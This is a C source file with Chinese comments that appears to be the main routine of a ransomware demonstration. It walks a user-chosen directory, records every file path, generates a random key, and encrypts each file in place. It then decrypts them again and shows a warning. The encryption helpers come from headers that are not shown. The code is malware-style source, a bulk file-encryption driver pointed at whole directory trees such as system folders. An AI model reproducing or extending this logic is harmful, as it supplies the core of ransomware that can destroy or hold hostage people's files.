#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "search_file.h"
#include "encode.h"
#include "random_key.h"
#include "warning.h"

#define MAX_LINE_LENGTH 256

int main()
{
    // 遍历目录并将文件路径写入output.txt
    TCHAR input[MAX_PATH];
    printf("输入想要遍历的目录。如：C:\\\\windows 或 C:\\\\Documents and Settings\n");
    scanf("%s", input);
    FILE *fp = fopen("output.txt", "wb");
    if (!fp)
    {
        printf("无法打开文件\n");
        return 1;
    }
    findFile(input, fp);
    fclose(fp);

    // 生成随机密钥
    uint8_t *key = random_key();

    // 加密文件
    fp = fopen("output.txt", "rb");
    if (!fp)
    {
        printf("无法打开文件\n");
        free(key);
        return 1;
    }

    char line[MAX_LINE_LENGTH];
    while (fgets(line, MAX_LINE_LENGTH, fp))
    {
        // 去掉行末的换行符
        int len = strlen(line);
        if (line[len - 1] == '\n')
        {
            line[len - 1] = '\0';
        }

        printf("正在加密文件 %s\n", line);
        encode(line, key);
    }

    fclose(fp);

    system("pause");
    
    // 解密文件
    fp = fopen("output.txt", "rb");
    if (!fp)
    {
        printf("无法打开文件\n");
        free(key);
        return 1;
    }

    while (fgets(line, MAX_LINE_LENGTH, fp))
    {
        // 去掉行末的换行符
        int len = strlen(line);
        if (line[len - 1] == '\n')
        {
            line[len - 1] = '\0';
        }

        printf("正在解密文件 %s\n", line);
        decode(line, key);
    }

    fclose(fp);

    free(key);

    pop_warning();

    system("pause");

    return 0;
}